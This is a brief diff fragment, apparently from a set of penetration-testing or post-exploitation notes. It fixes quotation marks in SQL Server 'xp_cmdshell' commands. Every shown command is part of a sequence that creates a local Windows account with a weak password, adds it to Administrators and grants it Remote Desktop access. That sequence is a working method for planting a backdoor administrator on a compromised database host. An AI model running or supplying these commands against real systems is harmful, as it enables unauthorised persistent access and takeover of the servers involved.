@@ -11,7 +11,7 @@ exec xp_cmdshell 'net user kalisa pass /add'
 go
 exec xp_cmdshell 'net localgroup Administrators kalisa /add'
 go
-exec xp_cmdshell 'net localgroup “Remote Desktop Users” kalisa /add'
+exec xp_cmdshell 'net localgroup "Remote Desktop Users" kalisa /add'
 go
 
 ------------------------------
